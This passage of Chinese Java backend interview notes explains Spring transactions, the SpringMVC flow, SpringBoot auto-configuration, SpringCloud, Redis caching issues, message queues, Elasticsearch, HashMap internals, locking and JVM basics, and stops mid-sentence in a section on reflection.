@Service 用于实例化对象 @Repository（dao层） 用于实例化对象 @Scope 设置spring对象的作用域 @PostConstruct、@PreDestory 用于设置spring创建对象之后和销毁之前要执行的方法 @Value 简单属性的依赖注入 @Autowired 对象属性的依赖注入 @ComponentScan 组件扫描 @Bean 用于将方法的返回值对象放入容器 @PropertySource 用于引入其它的properties配置文件 @Import 在一个配置类中导入其它配置类的内容 @Configuration 被此注解标注的类会被Spring认为是配置类，Spring在启动时会自动扫描并加载所有配置类，然后将配置类中bean放入容器 @Transactional 此注解可以标注在类上，也可以标在方法上，表示当前类中的方法具有事务管理功能 Spring支持的事务管理方式 编程式事务：在代码中硬编码，此方式的缺点是代码耦合，复用性低；优点是可以精确控制要增强的代码（不仅仅限于方法的粒度） 声明式事务：是AOP思想的一种应用，将业务方法作为切点，将事务处理方法作为增强，通过动态代理实现事务的管理，此方法优缺点与编程式相反 Spring的事务传播行为 事务传播行为是为了解决业务层方法之间相互调用的事务问题，当事务方法被另一个事务方法调用时，必须指定事务应该如何传播。 Spring支持7种事务传播行为 propagation_required（必须）：存在就加入；没有就创建 propagation_requires_new（必须新）：创建新事务，有就挂起 propagation_supports（支持）：存在就加入；没有就非事务 propagation_not_supported（不支持）：非事务运行，有就挂起 propagation_mandatory（强制）：存在就加入；没有就抛异常 propagation_never（强制没有）：非事务运行，有就抛异常 propagation_nested（嵌套）：如果当前存在事务，则创建一个事务作为当前事务的子事务来运行；如果当前没有事务，则创建一个事务（嵌套事务开始执行时，将取得一个保存点，如果这个嵌套事务失败，将回滚到此保存点；嵌套事务是外部事务的一部分，只有当外部事务结束后它才会被提交） spring的事务隔离级别 isolation_default：这个是PlatfromTransactionManager默认的隔离级别，使用数据库默认的事务隔离级别 isolation_read_uncommitted：读未提交：所有的事务都可以读取到别的事务中未提交的数据，会产生脏读问题 isolation_read_committed：读已提交：是大多数数据库默认的隔离级别，满足了简单的隔离要求：一个事务只能看见已经提交事务的数据，可以避免脏读问题；但随之而来产生了不可重复读和虚读等问题 isolation_repeatable_read：可重复读：MySQL默认隔离级别，确保了一个事务中多个实例在并发读取数据时，读取到一样的数据；但也导致了幻读的问题 isolation_serializable：可串行化：事务的最高级别，通过强制事务排序，使之不会相互冲突，从而解决幻读问题。它是在每个读的数据行上加锁，这样一来大幅降低事务的并发能力 - 不可重复读：是指在一个事务内，多次读同一数据。在这个事务还没有结束时，另外一个事务也访问该同一数据。那么，在第一个事务中的两次读数据之间，由于第二个事务的修改，那么第一个事务两次读到的的数据可能是不一样的。这样就发生了在一个事务内两次读到的数据是不一样的，因此称为是不可重复读。 - 幻读（虚读）：是指当事务不是独立执行时发生的一种现象，例如第一个事务对一个表中的数据进行了修改，这种修改涉及到表中的全部数据行。同时，第二个事务也修改这个表中的数据，这种修改是向表中插入一行新数据。那么，以后就会发生操作第一个事务的用户发现表中还有没有修改的数据行，就好象发生了幻觉一样。 - 不可重复读和幻读（虚读）差别 不可重复读的重点是修改： 同样的条件，你读取过的数据，再次读取出来发现值不一样了 幻读的重点在于新增或者删除： 同样的条件，第 1 次和第 2 次读出来的记录数不一样 简单来讲，前一个是读取到的数据不一样，后一个是读取到的数据量不一样 - 幻读指当用户读 取某一范围的数据行时，另一个事务又在该范围内插入了新行，当用户再读取该范围的数据行时，会发现有新的“幻影” 行，可通过**多版本并发控制**（MVCC）机制解决该问题 Spring 的对象默认是单例的还是多例的? 单例 bean 存不存在线程安全问题呢? 单例的 单例对象是所有线程共享一个实例，因此就可能会存在线程安全问题。但是单例对象又分为无状态和有状态 无状态对象，只对对象的成员变量进行查询操作，不会修改成员变量的值，因此不存在线程安全问题 有状态对象，会对成员变量的数据进行修改操作，因此存在线程安全问题 所以，只有有状态的单例对象才会存在线程安全问题 处理方式： 将作用域由singleton改为prototype 在类中定义ThreadLocal的成员变量，将可变的成员变量保存在TheadLocal中，相当于为每个线程提供了一个独立的变量副本，每个线程只需要操作自己的线程副本变量，从而解决线程安全问题 SpringMVC SpringMVC主要组件 DispatcherServlet：前端控制器，接收请求、响应结果，相当于转发器 HandleMapping：处理映射器，根据请求的URL来查找Handler HandleAdapter：处理器适配器，负责调用处理器Handler Handler：处理器，需要程序员开发，处理业务逻辑的Java类 ViewResolver：视图解析器：进行视图的解析，根据视图逻辑名解析成真正的视图 View：视图页面，它的实现类支持不同的视图类型（jsp、freemarker、pdf等等） 谈一下SpringMVC的执行流程以及各个组件的作用 用户发送请求到前端控制器DispathcherServlet 前端控制器DispathcherServlet收到请求调用处理器映射器HandlerMapping，去查找处理器Handler 处理映射器HandlerMapping找到具体的处理器Handler（可以根据XML配置、注解进行查找）及拦截器（如果有），返回给映射器前端控制器DispathcherServlet 前端控制器DispathcherServlet调用处理器适配器HandlerAdapter 处理器适配器HandlerAdapter调用自定义的处理器类（Controller，也叫后端控制器），将得到的参数进行处理并返回结果给处理器适配器HandlerAdapter 处理器适配器HandlerAdapter将得到的结果返回给前端控制器DispathcherServlet 前端控制器DispathcherServlet将ModelAndView传给视图解析器ViewReslover 视图解析器ViewReslover将得到的参数从逻辑视图转换为物理视图并返回给前端控制器DispatherServlet 前端控制器DispatherServlet调用物理视图进行渲染并返回 前端控制器DispatherServlet将渲染后的结果返回给浏览器 SpringMVC支持的转发和重定向的写法 转发： forward方式：在返回值前面加“forward”，比如forword:user.do?name=zhangsan 重定向：redireat方式：在返回值前面加redirect，比如redirect:http://www.baidu.com SpringMVC常用注解 注解 作用 位置 @RequestMaping 用于处理url请求路径映射 类或方法上 @RequestBody 实现接收http请求的json数据，并转换为java对象 形参前 @ResponseBody 实现将controller方法返回对象转换为json对象 @PathVariable /test/id => /test/{id}从url路径上获取指定参数，@PathVariable(\"参数名\") 形参前 @RequestParam /test?id=10，用于对传入的参数做一些限制，其中属性有- value：默认属性，用于指定传入参数的名称- required：用于指定此参数是否必传- defaultValue：当参数为非必传且没有传入时，指定一个默认值 形参前 @ControllerAdvice 表示该类是一个全局异常处理类 类上 @ExceptionHandler(Exception.class) 表示该方法可以处理的异常类型 处理异常类中的方法上 SpringMVC统一异常处理的思想和实现方法 对异常进行抛出，最终会抛到框架中，由框架指定异常处理类进行统一处理 方式一：创建一个自定义处理器（实现HandlerExceptionResolver接口），并实现里面的异常处理方法，然后将这个类交给Spring容器管理 方式二：在类上添加@ControllerAdvice注解，表明这是一个全局异常处理类，在方法上添加@ExceptionHandler注解，在ExceptionHandler中的value属性指定可以处理的异常类型 SpringMVC通过转发数据传递到前台的几种写法？ 方式一：直接使用request域进行数据传递 request.setAttirbuate(\"name\", value); 方式二：使用Model进行传递，底层会将数据放入request域进行数据传递 model.addAttribuate(\"name\", value); 方式三：使用ModelMap传递，底层会将数据放入request域进行数据传递 modelmap.put(\"name\", value); 方式四：借用ModelAndView在其中设置数据和视图 mv.addObject(\"name\", value); mv.setView(\"success\"); return mv; SpringMVC中拦截使用步骤？ 创建一个类实现HandlerInterceptor，重写接口中的抽象方法 preHandle方法：在调用处理器之前调用该方法，如果返回true则请求继续进行 postHandle方法：在调用完处理器后调用该方法 afterCompletion方法：在前端控制器渲染完页面后嗲用该方法 注册拦截器 @Configuration public class WebMvcConfig implements WebMvcConfigurer { @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(new 自定义的拦截器对象).addPathPatterns(\"拦截路径规则\").excludePathPatterns(\"放行规则\"); } } SpringBoot的优点 版本锁定：SpringBoot在父工程中进行了大量常见依赖版本锁定，省去了我们查找依赖版本和解决版本冲突的麻烦 起步依赖：SpringBoot以功能化的方式将需要的依赖进行组装，我们只要以start的方式进行引入 默认配置：SpringBoot实现了大量依赖框架的默认配置项，我们无须再进行配置 内置Tomcat：SpringBoot内置了一个tomcat，使用它开发的程序无需再进行tomcat部署，可以直接运行 SpringBoot的启动器starter starter启动器，可以通过启动器集成其他的技术，可以提供对应技术的开发和运行环境 执行原理 springboot启动时会扫描jar包中的spring.factories文件，去加载自动配置类，创建这些类的对象，放到spring容器中 SpringBoot中的配置文件 application和bootstrap两种配置文件 bootstrap由父ApplicationContext加载，比application配置文件优先被加载，是不能被覆盖的属性，可以加载一些加密/解密的数据 读取配置文件的方式 直接获取注入Environment进行获取，这个对象是Spring默认提供的封装配置的对象 使用@Value注解直接注入对应的值，这能获取到Spring中Environment的值 使用@ConfigurationProperties注解把对应的值绑定到一个配置对象，然后将配置对象注入到需要读取配置的对象 SpringBoot常用注解 注解 作用 位置 @SpringBootApplication 封装了核心的@SpringBootConfiguration+@EnableAutoConfiguration +@ComponentScan这三个类 @MapperScan 指定mybatis接口类的路径，完成对mybatis接口的扫描 @RestController 是@Controller 和@ResponseBody的结合 @RequestMapping 请求路径 @Get/Post/Put/DeleteMapping RESTful风格指定子路径 @PathVariable 路径变量注解，用{}定义url部分的变量名 @Service 标记业务层的注解 @Component 注入到IOC容器中 @ControllerAdvice和@ExceptionHandler 配合完成统一异常拦截处理 SpringBoot自动装配原理 SpringBoot自动装配主要是基于注解编程和约定优于配置的思想来进行设计的 自动装配就是自动地把其他组件中的Bean装载到IOC容器中，不需要再去配置文件中添加大量配置 我们只需要在SpringBoot的启动类上添加一个@SpringBootApplication的注解,就可以开启自动装配 SpringBootApplication底层最重要的一部分是@EnableAutoConfiguration这个注解来实现的，归纳为以下三个核心步骤 SpringBoot会读取所有jar包/META-INF/spring.factories文件中EnableAutoConfiguration键对应的值（SpringFactories机制） 这些值必须声明为Spring的配置类，也就是在类中添加@Configuration注解 为了防止非当前所需要的组件进入到容器，配置类中需要使用@Conditional注解来声明配置成立的必要条件 SpringCloud SOA和微服务的区别 SOA是一种面向服务的架构风格，它将应用程序的功能设计为一组可重用的服务。微服务架构是一种基于分布式系统和服务的架构风格，它将应用程序分解为一组小型服务，每个服务都可以独立部署、扩展和替换。 服务粒度不同：SOA的服务粒度相对较大，而微服务的服务粒度更小。 技术实现不同：SOA通常使用SOAP和XML作为服务之间的通信协议，而微服务则更倾向于使用轻量级的REST和JSON。 对于业务的支持不同：SOA更注重对于业务的复用和整合，而微服务则更注重对于业务的创新和快速迭代。 你所知道的微服务技术栈 服务开发：springboot spring springmvc 服务配置与管理:Netfix公司的Archaiusm ,阿里的Diamond 服务注册与发现:Eureka,Zookeeper nacos 服务调用:Rest RPC gRpc 服务熔断器:Hystrix 服务负载均衡:Ribbon Nginx 服务接口调用:Fegin 消息队列:Kafka Rabbitmq activemq 服务配置中心管理:SpringCloudConfig 服务路由（API网关）Zuul 事件消息总线:SpringCloud Bus SpringCloud有哪些核心组件 Eureka: 注册中心, 服务注册和发现 Ribbon: 负载均衡, 实现服务调用的负载均衡 Hystrix: 熔断器 Feign: 远程调用 Zuul: 网关 Spring Cloud Config: 配置中心 什么是服务熔断、服务降级 熔断机制是应对雪崩效应的一种微服务链路保护机制。当某个微服务不可用或者响应时间过长，会进行服务降级，进而熔断该节点微服务的调用，快速返回错误的响应信息。当检测到该节点微服务调用响应正常后恢复调用链路。 springcloud框架里熔断机制通过hystrix实现，默认是如果在10秒内调用20次，失败比例达到50%，则触发熔断，则会开启断路器5秒。 Eureka和zookeeper的区别 服务注册方式不同：Eureka是基于HTTP的RESTful接口，而Zookeeper则是基于Zookeeper自己的API。 集群管理方式不同：Eureka集群中的所有节点彼此对等，没有主节点；而Zookeeper集群中有一个主节点和多个从节点，主节点负责处理写操作，从节点负责处理读操作。 数据复制方式不同： Eureka，它使用异步的方式进行数据复制，保证了高可用性，但可能会存在数据不一致的情况是AP的； Zookeeper使用同步方式进行数据复制，保证数据一致性，是CP的 springcloud和dubbo的区别 Dubbo SpringCloud SpringCloudAlibaba 注册中心 zookeeper、Redis Eureka、Consul Nacos、Eureka 服务远程调用 Dubbo协议、HTTP、REST等 Feign（http协议） Dubbo、Feign 配置中心 无 SpringCloudConfig SpringCloudConfig、Nacos 服务网关 无 SpringCloudGateway、Zuul SpringCloudGateway、Zuul 服务监控和保护 dubbo-admin，功能弱 Hystrix Sentinel RPC和REST的对比 通信方式：RPC使用远程过程调用协议进行通信，而REST使用HTTP协议进行通信。 传输格式：RPC使用二进制传输数据，REST使用文本格式传输数据。 RPC的主要缺陷是服务提供方和调用方之间的依赖太强，需要对每一个微服务进行接口的定义。 REST是轻量级的接口，服务的提供和调用不存在代码之间的耦合，只需要遵守RESTful规范即可。 微服务之间是如何通讯的 Feign调用（HTTP/REST）：通过HTTP协议进行通信，可以使用RESTful API进行数据传输。 RPC：使用类似于本地调用的方式进行远程调用，常用的框架有gRPC、Thrift、Dubbo等。 消息中间件：通过消息队列进行异步通信，例如Kafka、RabbitMQ等。 服务总线：使用像Spring Cloud Bus这样的工具实现服务之间的通信。 Redis redis的持久化 RDB（Redis DataBase）：就是在不同的时间点，将 redis 存储的数据生成快照并存储到磁盘等介质上。RDB的执行方式有save和bgsave两种，其中使用save来执行RDB会导致主线程阻塞。bgsave的话是异步的，bgsave时会执行fork创建子进程，采用copy-on-write(写时拷贝技术)，主进程会复制一份数据进行修改，而子进程会将修改前的数据进行持久化到磁盘中，避免脏数据产生。 RDB执行间隔时间长，两次RDB之间写入数据有丢失的风险 例如，配置为\"save 900 1\"表示在900秒(15分钟)内如果发生了至少1个键值对的变化，则进行一次快照保存。 AOF（Append Only File）：就是将 redis 执行过的所有写命令记录下来。另外，可以通过执行bgrewriteaof命令，可以让AOF文件执行重写功能，用最少的命令达到相同效果。AOF 方式的优点是能够保证数据的完整性，但相对于 RDB 方式，备份的数据量较大，对性能影响较大。 刷盘策略： 每执行一次写命令，立即记录到AOF文件 每隔1秒将缓冲区数据写到AOF文件，是默认方案 先放入AOF缓冲区，由操作系统决定何时将缓冲区内容写回磁盘 如果 redis 重启的话，则会优先采用 AOF 方式来进行数据恢复，这是因为 AOF 方式的数据恢复完整度更高。 数据一致性问题 常见的数据同步方案有三种： 读写请求串行化：即所有读写请求都先发送到数据库，等数据库处理完后再更新缓存 优点：实现简单，粗暴 缺点：业务耦合度高，响应速度慢 基于消息中间件异步通知 优点：低耦合，实现难度一般 缺点：依赖mq的可靠性 Canal监听binlog 优点：完全解除服务间耦合 缺点：开启binlog增加数据库负担、实现复杂度高，只能在MySQL使用 缓存雪崩问题 表示是指在同一时段内大量的缓存key同时失效或者Redis服务宕机，导致大量的请求到达了数据库，带来了巨大的数据库压力。 设置随机的缓存过期时间：将缓存的过期时间设置随机，在一定时间范围内分散缓存失效的时间。 利用Redis集群提高服务的高可用性 多级缓存：在系统中增加多级缓存，如本地缓存、分布式缓存等，让缓存失效的时间错开，降低失效的概率。 熔断降级：在缓存失效的情况下，使用熔断降级机制，及时返回错误响应，避免请求直接打到后端服务导致服务崩溃。 并发控制：对关键资源进行并发控制，如使用分布式锁等方式，避免缓存失效后大量请求涌入数据库或者其他后端服务。 缓存穿透问题 缓存穿透是指客户端请求的数据在缓存中和数据库中都不存在，这样的缓存永远都不会生效，这些请求都会打到数据库上。 解决方案： 缓存空对象：哪怕这个数据在数据库中也不存在，我们也把这个数据存入到redis中去，这样，下次用户过来访问这个不存在的数据，那么在redis中也能找到这个数据就不会打到数据库了。 布隆过滤器：布隆过滤器其实采用的是哈希思想去判断当前这个要查询的这个数据是否存在，如果布隆过滤器判断有可能存在，则放行，这个请求会去访问redis。但是会存在误判的情况。 缓存击穿问题 缓存击穿问题也叫热点key问题，就是说一个被高并发访问并且缓存重建业务较为复杂的key突然失效了，那么此时无数的请求访问就会在瞬间给数据库带来巨大的压力冲击，这种情况叫缓存击穿。 使用互斥锁，避免并发问题。对于同一个key的请求，在数据库查询完毕之前，可以加互斥锁，避免并发请求同时访问数据库，从而导致数据库压力过大。 设置热点数据永不过期。对于一些访问量极高，且数据变化不频繁的数据，可以将其设置为永不过期，这样就能避免缓存失效导致的击穿问题。 但是不设置过期时间，这样数据不就一直占用我们内存了吗，我们可以采用逻辑过期方案。查询缓存时发现逻辑时间已过期，则开启新现场重新构建缓存，同时返回过期数据。使用了异步的构建缓存，缺点在于在构建完缓存之前，返回的都是脏数据。 采用分布式锁，保证只有一个请求能够去访问数据库。在缓存失效的瞬间，只允许一个请求访问数据库，其他请求则等待这个请求的结果，并将结果缓存起来。这样可以有效地避免大量请求同时涌入数据库的问题。 热点数据和冷数据是什么 热点数据是指被频繁访问的数据，而冷数据则相反，指的是被很少或不访问的数据。通常情况下，热点数据是需要尽可能被缓存的，以减轻后端系统的负担，提高访问速度和响应时间。而冷数据可以适当降低缓存时间，减少缓存的压力，同时保证后端数据的更新及时生效。 Redis的分布式锁 它的实现原理是利用Redis的单线程特性和SETNX命令（SET if Not eXists）用于设置一个键值对，如果该键不存在则设置成功，返回1；如果该键已存在，则设置失败，返回0。通过竞争加锁来控制共享资源的访问。当多个应用程序需要同时访问共享资源时，它们需要先竞争获取锁，只有获取锁的应用程序才能够访问共享资源，其他应用程序则需要等待锁被释放。 特性： 安全特性：互斥访问，即永远只有一个client能拿到锁 避免死锁：最终client都可能拿到锁，不会出现死锁的情况 容错性：只要大部分Redis节点存活就可以正常提供服务 MQ消息中间件 使用RabbitMQ有什么好处 异步处理：使用消息队列可以实现异步处理，提高系统的响应速度和吞吐量，实现流量削峰。 解耦合：消息队列可以将发送者和接收者解耦，发送者只需要将消息发送到队列，而不需要知道消息被哪些接收者接收。 可靠性：RabbitMQ有消息持久化机制和消息确认机制，可以保证消息的可靠传输。 扩展性：可以通过增加消息队列节点来实现系统的水平扩展。 如何保证消息的可靠传输？如何确保消息正确地发送至RabbitMQ？ 如何确保消息接收方消费了消息 RabbitMQ可以开启ACK消息确认机制，在发送方可以通过开启confirm模式来确保发送方的消息正确发送至RabbitMQ，它对所有信道上发布的消息会指派一个唯一的ID，一旦消息被投递到目的队列后，或者被持久化后，信道会发送一个确认信息给生产者。如果RabbitMQ内部发生错误导致消息丢失，则会发送一条未确认消息。在接收方，消费者接收到每一条信息后都必须进行确认。只有消费者确认了消息，RabbitMQ才会把消息从队列中删除。 如何避免消息重复投递或重复消费 为每条消息设置一个唯一的标识id , 将已经消费的消息记录保存起来 , 后期再进行消费的时候判断是否已经消费过即可 , 如果已经消费过则不消费 , 如果没有消费过则正常消费，这样就可以避免同一条消息被重复消费。 如何保证消息的顺序性 通过单一的队列：将具有相同顺序的消息发送到同一个队列中，并将消费者数量设置为1，这样就可以保证消息按照发送的顺序被消费。 通过多个队列和路由键：可以为每个需要保证顺序的消息类型创建一个单独的队列，并为每个队列设置相应的路由键。将消息按照其对应的路由键发送到相应的队列中，消费者消费消息时按照路由键的顺序进行消费。 需要注意的是，在进行多个队列和路由键的方式中，需要保证消息发送的顺序与路由键的顺序一致，否则可能会出现消息顺序不正确的情况。 Kafka、ActiveMQ、RabbitMQ、RocketMQ都有什么区别 吞吐量：kafka和rocketMQ单机吞吐量为10万机，ActiveMq和RabbitMQ则是万级。 延迟：rabbitMQ是微秒级别，其他的是毫秒级。 Kafka适用于处理海量数据和追求高吞吐量场景，RocketMQ适用于可靠性要求很高的金融互联网领域。 ElasticSerach 倒排索引 就是通过分词策略，对所有数据的内容进行拆分，然后形成词与文章的映射关系表，这种词典+映射表就是倒排索引。 公司es的集群架构，索引数据大小，分片有多少 ES调优 采取基于日期模板创建索引，通过 roll over API 滚动索引 对索引做 force_merge 操作，以释放空间 写入前副本数设置为 0；写入前关闭 refresh_interval 设置为-1，禁用刷新机制； 禁用 wildcard；禁用批量 terms（成百上千的场景）； 充分利用倒排索引机制，能 keyword 类型尽量 keyword； elasticsearch是如何实现master选举的 第一步：确认候选主节点数是否达标（discovery.zen.minimum_master_nodes） 第二步：判断是否具备master资格。具备候选主节点资格的优先返回；若两节点都为候选主节点，则 id小的值会主节点 脑裂问题 当候选数量为两个时，只能修改为唯一的一个 master 候选，其他作为 data节点，避免脑裂问题 当候选数量大于两个时，可以通过设置最少投票通过数量（discovery.zen.minimum_master_nodes）超过所有候选节点一半以上来解决脑裂问题； 在并发情况下，Elasticsearch如果保证读写一致 可以通过版本号使用乐观并发控制，以确保新版本不会被旧版本覆盖，由应用层来处理具体的冲突； 另外对于写操作，一致性级别支持 quorum/one/all，默认为 quorum，即只有当大多数分片可用时才允许写操作。但即使大多数可用，也可能存在因为网络等原因导致写入副本失败，这样该副本被认为故障，分片将会在一个不同的节点上重建。 对于读操作，可以设置 replication 为 sync(默认)，这使得操作在主分片和副本分片都完成后才会返回；如果设置 replication 为 async 时，也可以通过设置搜索请求参数 _preference 为 primary 来查询主分片，确保文档是最新版本。 数据结构 Hashmap的底层原理 HashMap的数据结构： HashMap实际上是数组和链表的结合体。 HashMap 基于 Hash 算法实现的 当我们往HashMap中put元素时，利用key的hashCode重新hash计算出当前对象的元素在数 组中的下标 存储时，如果出现hash值相同的key，此时有两种情况。 如果key相同，则覆盖原始值； 如果key不同（出现冲突），则将当前的key-value放入链表中 获取时，直接找到hash值对应的下标，在进一步判断key是否相同，从而找到对应值。 HashMap链表树化 JDK1.8之前，HashMap采用数组 + 链表实现，从JDK1.8开始，优化为数组 + 链表 + 红黑树实现 当某个链表元素超过 8 个，并且数组长度>=64时，链表会转为红黑树，当红黑树节点 HashMap扩容 初始长度为16 当存储的元素个数超过阈值时，数组会进行扩容 （阈值 = 数组长度 * 扩容因子） 默认的扩容因子是0.75，也就是当元素个数到达 160.75=12 时，会进行扩容，每次扩容为*原先的 2 倍 HashTable扩容 初始长度11 负载因子0.75 扩容长度2n+1 Hashmap和Hashtable ConcurrentHashMap区别 HashMap 和 HashTable 区别 HashMap是非线程安全的，而ConcurrentHashMap是线程安全的，所以HashMap的效率要比HashTable要高。 HashMap的键和值都允许有null值存在，而HashTable则不行 HashTable是同步的，而HashMap不是。因此HashMap更适合于单线程环境，而HashTable适合于多线程环境。不过由于HashTable是遗留类，内部实现很多没优化和冗余；所以不使用HashTable，而是使用ConcurrentHashMap代替。 HashTable 和 ConcurrentHashMap 区别 HashTable使用的是Synchronized修饰，ConcurrentHashMap在JDK1.7使用锁分段技术来保证线程安全。JDK1.8开始取消分段锁，采用CAS和synchronize来保证并发安全。数据结构和HashMap1.8的结构类似，为数组+链表/红黑树。synchronized只锁定当前链表或红黑树的首节点，这样只要hash不冲突，就不会产生并发。 ConcurrentHashMap 底层具体实现知道吗？ ConcurrentHashMap 是一种线程安全的高效Map集合 底层数据结构： JDK1.7的 ConcurrentHashMap 底层采用 分段的数组+链表 实现， JDK1.8 采用的数据结构跟HashMap1.8的结构一样，数组+链表/红黑二叉树。 JDK1.7 首先将数据分为一段一段的存储，然后给每一段数据配一把锁，当一个线程占用锁访问其中一个段 数据时，其他段的数据也能被其他线程访问。 在JDK1.7中，ConcurrentHashMap采用Segment + HashEntry的方式进行实现 一个 ConcurrentHashMap 里包含一个 Segment 数组。Segment 的结构和HashMap类似，是一 种数组和链表结构，一个 Segment 包含一个 HashEntry 数组，每个 HashEntry 是一个链表结构 的元素，每个 Segment 守护着一个HashEntry数组里的元素，当对 HashEntry 数组的数据进行修 改时，必须首先获得对应的 Segment的锁。 Segment 是一种可重入的锁 ReentrantLock，每个 Segment 守护一个HashEntry 数组里得元 素，当对 HashEntry 数组的数据进行修改时，必须首先获得对应的 Segment 锁。 JDK1.8 在JDK1.8中，放弃了Segment臃肿的设计，取而代之的是采用Node + CAS + Synchronized来保 证并发安全进行实现，synchronized只锁定当前链表或红黑二叉树的首节点，这样只要hash不冲 突，就不会产生并发 , 效率得到提升 多线程 Threadloal的原理 ​ ThreadLocal的原理就是通过为每个线程提供独立的变量副本来避免多个线程之间的竞争和同步问题，从而实现线程安全的操作。 ​ ThreadLocal适用于每个线程需要自己独立的实例，而且该实例需要在多个方法中被使用，也就是变量在线程间隔离而在方法或类间共享的场景。 ​ ThreadLocal的实现是通过ThreadLocalMap这个类实现的，每个Thread维护一个ThreadLocalMap的引用，ThreadLocalMap的键为ThreadLocal对象本身，值为该线程所持有的变量副本。 ThreadPoolExecutor的缺点 队列容量有限：ThreadPoolExecutor中的任务队列默认是有界的，如果线程池中的线程数量达到上限并且队列已满，则新的任务将被拒绝。 线程生命周期难以控制：线程池中的线程是由ThreadPoolExecutor来管理的，这意味着线程的创建、销毁和重用等生命周期都由ThreadPoolExecutor来控制，开发者难以对线程的生命周期进行精细的控制。 对CPU密集型任务不友好：ThreadPoolExecutor中的线程池适用于I/O密集型任务，但对于CPU密集型任务，由于线程的调度和切换等开销，可能会导致性能下降。 对线程池的调优需要一定的经验：ThreadPoolExecutor提供了很多参数可以调整线程池的性能，但是对线程池的调优需要一定的经验和技巧，否则可能会导致性能问题。 锁升级 对于并发控制，可以采用无锁和有锁两种方式进行控制，例如采用CAS乐观锁在程序上进行version版本控制并发修改；有锁的话，如果只有一个线程来竞争锁，则直接把这个锁给它，这时候就是偏向锁，然后如果此时还有第二个线程过来获取锁，则升级为自旋锁，这个时候还是轻量级锁；如果还有第三个或者更多线程过来获取锁，则升级为重量级锁。比如常见的synchronized。 同步锁、死锁、乐观锁、悲观锁 同步锁 同步锁是一种用于多线程同步的机制，通过对代码块或方法加锁的方式来保证同一时刻只有一个线程能够访问被锁定的代码块或方法。Java 中的 synchronized 关键字就是用于实现同步锁的机制。 死锁 死锁指的是两个或多个线程相互等待对方释放所持有的锁，从而导致所有线程都无法继续执行下去的情况。产生死锁的条件： 互斥：资源不能同时被多个线程占有，如果一个线程占有了某个资源，其他线程必须等待该资源释放。 占有和等待：线程A已经占有了资源X，但还需要资源Y才能继续执行，而线程B占有了资源Y，但需要资源X才能继续执行。 不可抢占：线程不能强制抢占其他线程占有的资源，只能在资源被释放后重新申请。 循环等待：多个线程形成一个环路，每个线程都在等待下一个线程所占有的资源。 解决死锁的方法通常是对线程请求锁的顺序进行规定，或者使用超时机制强制释放锁。 乐观锁 总是假设最好的情况，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断以下在此期间别人有没有去更新这个数据，可以使用版本号机制和CAS算法实现。 版本号机制 在数据表中加入一个数据版本号version字段，表示数据被修改的次数，当数据被修改时，version指会加一。当线程A要重新更新数据值时，在读取数据的时候也会读取version值，在提交更新时，若刚才读取到的version值与当前数据库中的version值相等才更新，否则重新更新操作，直到更新成功。 CAS算法 CAS 即compare and swap（比较并交换），是一种有名的无锁算法，在不适用锁的情况下实现多线程之间的变量同步，也就是在没有线程被阻塞的情况下实现变量同步，所以也叫非阻塞同步。CAS算法涉及到三个操作数：1、要更新的变量V 2、预期的值E 3、新值N仅当V值等于E值时，才会将V的值设置为N，否则说明都不做。最后CAS返回当前V的值。CAS算法需要你额外给出一个期望值，也就是你认为现在变量应该是是样子的，如果变量不是你想象的样子，就说明已经被别人修改过，就重新读取，再次尝试修改即可。 悲观锁 总是假设最坏的情况，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会阻塞直到它拿到锁。在实现上，通常会使用数据库中的排他锁（如 SELECT ... FOR UPDATE 语句）、 Java 中的 synchronized 关键字、以串行的方式取代并发执行等机制都是悲观锁的体现。 乐观锁与悲观锁的选择： 读多写少的场景适用于乐观锁；写多的场景适用于悲观锁 synchronized底层实现原理 synchronized可以保证方法或代码块在运行时，同一时刻只有一个方法可以进入到临界区，同时它还可以保证共享变量的内存可见性。 synchronized实现同步的基础： 普通同步方法，锁是当前实例对象 静态同步方法，锁是当前类的class对象 同步方法块，锁是括号里面的对象 synchronized和volatile的区别是什么 volatile本质是在告诉jvm当前变量在寄存器（工作内存）中的值是不确定的，需要从主存中读取；synchronized则是锁定当前变量，只有当前线程可以访问该变量，其他线程被阻塞住。 volatile仅能使用在变量级别；synchronized则可以使用在变量、方法、和类级别的。 volatile仅能实现变量的修改可见性，不能保证原子性；而synchronized则可以保证变量的修改可见性和原子性。 volatile不会造成线程的阻塞；synchronized可能会造成线程的阻塞。 volatile标记的变量不会被编译器优化；synchronized标记的变量可以被编译器优化 JVM JAVA代码在JVM是怎么执行的 jvm包含两个子系统（类装载、执行引擎）和两个组件（运行时数据区域、本地接口） 类装载：JVM在运行时通过类装载器加载class文件到jvm内存中 执行引擎：读取方法区中的字节码，并执行相应的指令。 本地接口：通过本地接口调用本地库的方法，以便Java程序可以调用系统底层的功能，如操作系统的文件和网络协议栈等，提高java应用程序的灵活性。 运行时数据区域：包括堆、栈、方法区、本地方法栈和程序计数器。 堆：用于存储对象实例的内存区域 栈：用于存储方法执行时的临时变量和操作数 方法区：用于存储类信息、常量池、静态变量等 本地方法栈：用于执行本地方法调用 程序计数器：是当前线程所执行的字节码的行号指示器 首先通过编译器把 Java 代码转换成字节码，类加载器（ClassLoader）再把字节码加载到 内存中，将其放在运行时数据区（Runtime data area）的方法区内，而字节码文件只是 JVM 的一 套指令集规范，并不能直接交给底层操作系统去执行，因此需要特定的命令解析器执行引擎 （Execution Engine），将字节码翻译成底层系统指令，再交由 CPU 去执行，而这个过程中需要 调用其他语言的本地库接口（Native Interface）来实现整个程序的功能。 什么是反射机制？ JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任 意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法 的功能称为java语言的反射机制。 优点： 运行期类型的判断，动态加载类，提高代码灵活度。 缺点： 性能瓶颈：反射相当于一系列解释操作，通知 JVM 要做的事情，性能比直接的java代码要 慢很多 在你进行项目开发的过程中有没有用到过反射 在我们的项目中经常会使用反射 + 自定义注解的方式去实现一些功能 , 例如 : 在前后端交互的时候, 后端Long类型返回前端后会产生精度丢失 , 我们的处理方式就是在服务端, 通过配置修改Jackson的序列化规则, 将一些Long类型字段转化为字符串返回给前端, 这个时候我们自定义了一个@IdEncrpt注解 , 通过反射获取类的属性, 判断属性上是否添加了@IdEncrpt注解, 如果添加了 , 就会通过反射获取属性值, 转化为字符串 在整合EMQ的时候 , 为了能够方便的接收订阅消息, 我们自定义了一个@Topic注解 , 作用在类上 , 